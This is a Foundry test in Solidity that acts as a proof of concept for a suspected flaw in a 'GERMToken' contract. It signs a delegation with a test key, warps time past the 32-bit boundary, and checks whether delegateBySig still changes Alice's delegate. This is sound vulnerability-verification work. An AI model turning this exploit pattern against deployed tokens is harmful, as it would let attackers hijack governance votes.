// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/GERMToken.sol";

contract GERMTest is Test {
    GERMToken token;
    
    // Typehash constants from GERM token
    bytes32 public constant DOMAIN_TYPEHASH = keccak256("EIP712Domain(string name,uint256 chainId,address verifyingContract)");
    bytes32 public constant DELEGATION_TYPEHASH = keccak256("Delegation(address delegatee,uint256 nonce,uint256 expiry)");
    
    address owner = address(0x1);
    address alice = vm.addr(1);  // Correct Alice address from known private key
    uint256 constant UINT32_MAX = 2**32;
    uint256 expiry;
    uint256 constant alicePk = 1;  // Known private key for Alice
    
    function setUp() public {
        vm.chainId(1);  // Fix chainId for consistent signature generation
        vm.startPrank(owner);
        token = new GERMToken();
        token.mint(alice, 100 ether);
        vm.stopPrank();
    }
    
    function testInconsistentStateUpdate() public {
        expiry = UINT32_MAX + 100 days;  // Expiry beyond 32-bit boundary
        
        // Get current nonce for Alice (starts at 0)
        uint256 nonce = token.nonces(alice);
        
        // Create valid signature as Alice
        (uint8 v, bytes32 r, bytes32 s) = getValidSignature(nonce, expiry);
        
        // PRE-STATE: Check initial delegate
        emit log("--- BEFORE-Trigger Delegates ---");
        address preDelegate = token.delegates(alice);
        emit log("Alice's initial delegate:");
        if (preDelegate == address(0)) {
            emit log("   None");
        } else {
            emit log_address(preDelegate);
        }

        emit log("--- Trigger DelegateBySig ---");
        // Set timestamp beyond 32-bit boundary
        uint256 blockTimestamp = UINT32_MAX + 50 days;
        vm.warp(blockTimestamp);
        
        // Critical vulnerability exploitation
        token.delegateBySig(address(this), nonce, expiry, v, r, s);

        emit log("--- AFTER-Trigger Delegates ---");
        // POST-STATE: Check updated delegate
        address postDelegate = token.delegates(alice);
        emit log("Alice's delegate after exploit:");
        emit log_address(postDelegate);
        
        // Vulnerability verification
        bool changed = (preDelegate != postDelegate);
        emit log("State changed:");
        if (changed) {
            emit log("   YES");
        } else {
            emit log("   NO");
        }
        
        // Final verdict
        if (changed) {
            emit log("Vulnerability Exists: Alice's delegation state was altered despite 32-bit overflow");
        } else {
            emit log("Vulnerability not Exist: Delegation state remained unchanged after exploit attempt");
        }
    }
    
    function getValidSignature(
        uint256 nonce,
        uint256 expiry
    ) internal view returns (uint8 v, bytes32 r, bytes32 s) {
        // Compute domain separator
        bytes32 domainSeparator = keccak256(abi.encode(
            DOMAIN_TYPEHASH,
            keccak256(bytes(token.name())),
            1,  // chainId set to 1
            address(token)
        ));
        
        // Compute struct hash
        bytes32 structHash = keccak256(abi.encode(
            DELEGATION_TYPEHASH,
            address(this),  // delegatee
            nonce,
            expiry
        ));
        
        // Prepare EIP-191 signed message
        bytes32 digest = keccak256(
            abi.encodePacked(
                "\x19\x01",
                domainSeparator,
                structHash
            )
        );
        
        // Sign with test address private key
        (v, r, s) = vm.sign(alicePk, digest);
    }
}